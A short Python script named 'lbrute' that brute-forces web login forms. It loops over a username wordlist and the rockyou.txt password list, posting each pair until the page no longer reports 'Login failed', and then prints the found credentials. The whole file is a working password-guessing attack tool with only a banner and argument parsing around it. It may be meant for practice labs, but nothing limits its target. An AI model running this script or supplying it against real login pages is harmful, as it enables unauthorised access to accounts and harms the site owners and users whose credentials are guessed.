#!/usr/bin/env python3

import pyfiglet
from colorama import Fore

import requests
from argparse import ArgumentParser
import sys
import time

import io

author = '@Ber1y'
text = pyfiglet.figlet_format("lbrute".upper())

parser = ArgumentParser()
parser.add_argument('-u', '--url', help = "The url login page", type = str)
parser.add_argument('-w', '--username', help = "The usernames wordlist", type = open)
parser.add_argument('-v', '--verbose', help = "Show more information about the attack", action = 'store_true')

args = parser.parse_args()
wordlist = '/usr/share/wordlists/rockyou.txt'

print(f"""{Fore.GREEN}
{text}
{Fore.WHITE}
Create by {author}
{'--'*30}
{Fore.WHITE}
This a very very basic bruteforcing tools.
:: URL			: {args.url}
:: Usernames		: {args.username.name}
:: Passwords		: {wordlist}
{'--'*30}
""")

def bruteforce(url, usernames, passwords):
	for user in usernames:
		user = user.strip()
		for pwd in io.open(passwords, encoding='latin-1'):
			pwd = pwd.strip()
			data = {"username" : user, "password" : pwd, "Login": "Login"}
			r = requests.post(url, data = data)

			if "Login failed" in r.text:
				if args.verbose:
					print(f"{Fore.RED}[-] {Fore.WHITE}Attacking: {user}:{pwd}")
			else:
				return (user, pwd)

try:
	if args.url and args.username:
		found = bruteforce(args.url, args.username, wordlist)
		print(f"{Fore.BLUE}[+] {Fore.WHITE}Credentials found: {found[0]}:{found[1]}")
	else:
		print(f"Some arguments are remember to enable this attack. Use \"-h\" to see the help options.")
except TypeError:
	print(f"{Fore.RED}[-] {Fore.WHITE}Credentials Not found. Try to use a nother wordlist or username.")
except:
	print(f"{Fore.BLUE}[-] {Fore.WHITE}Exits...")
